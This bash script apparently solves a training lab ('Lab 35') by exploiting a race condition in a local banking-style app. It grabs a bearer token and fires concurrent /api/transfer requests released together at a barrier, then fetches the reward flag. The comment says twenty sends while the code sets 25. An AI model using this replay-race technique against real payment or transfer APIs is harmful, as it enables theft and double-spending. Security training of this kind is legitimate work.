#!/usr/bin/env bash
# Lab 35 — twenty transfers of the whole balance, released together.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9350}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab35

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
TOKEN="$("$H5I" websec show res_0 --session "$SESSION" --raw |
    python3 -c 'import re,sys;print(re.search(r"tok_[0-9a-f]+",sys.stdin.read()).group(0))')"

# `--repeat 25 --race`: twenty sends leave from twenty threads that meet at a
# barrier first, so they arrive inside one window instead of twenty.
"$H5I" websec replay req_0 --session "$SESSION" --create --repeat 25 --race \
    --set method=POST --set path=/api/transfer \
    --set header.Content-Type=application/json \
    --set "header.Authorization=Bearer $TOKEN" \
    --set json.to=vault --set json.amount=100 >/dev/null

send "$SESSION" req_0 --create --set path=/api/rewards | flag
